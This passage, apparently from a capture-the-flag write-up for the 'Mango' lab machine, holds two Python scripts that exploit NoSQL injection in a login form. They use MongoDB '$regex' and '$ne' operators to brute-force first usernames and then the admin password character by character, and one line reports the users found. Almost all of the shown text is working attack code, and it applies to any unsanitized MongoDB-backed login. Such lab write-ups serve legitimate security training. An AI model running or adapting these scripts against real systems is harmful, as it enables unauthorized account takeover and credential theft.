User extraction script:

#!/usr/bin/python3
from pwn import *
import requests, re, string, signal, sys, time 

def def_handler(sif, frame):
    print("\n\n[^^] Exiting...\n")
    sys.exit(1)

# CTRL C
signal.signal(signal.SIGINT, def_handler)

# GLOBAL
login_url = "http://staging-order.mango.htb/"
characters = string.ascii_lowercase

# Principal Function
def makeNosqlI():
    username = ""
    p1 = log.progress("Brute force")
    p1.status("[-w-] Starting brute force attack")
    time.sleep(2)

    p2 = log.progress("User")

    while True:
        for character in characters:
            post_data = {
                'username[$regex]':'^m%s%s.*' % (username, character), 
                'password[$ne]':'admin',
                'login':'login'
            }
            p1.status("%s" % post_data)

            r = requests.post(login_url, data=post_data, allow_redirects=False)
            
            if r.status_code == 302:
                username += character
                p2.status(username)
                break

if __name__ == '__main__':
    makeNosqlI()

Through this script, we discover two valid users: admin and mango.

#!/usr/bin/python3
from pwn import *
import requests, re, string, signal, sys, time 

def def_handler(sif, frame):
    print("\n\n[^^] Exiting...\n")
    sys.exit(1)

# CTRL C
signal.signal(signal.SIGINT, def_handler)

# GLOBAL
login_url = "http://staging-order.mango.htb/"
characters = string.ascii_letters + string.digits + string.punctuation

# Principal Function
def makeNosqlI():
    password = ""
    p1 = log.progress("Brute force")
    p1.status("[-w-] Starting brute force attack")
    time.sleep(2)

    p2 = log.progress("Password")

    while True:
        for character in characters:
            post_data = {
                'username':'admin', 
                'password[$regex]': "^%s%s.*" % (password, re.escape(character)),
                'login':'login'
            }
            p1.status("%s" % post_data)

            r = requests.post(login_url, data=post_data, allow_redirects=False)
            
            if r.status_code == 302:
                password += character
                p2.status(password)
                break

if __name__ == '__main__':
    makeNosqlI()
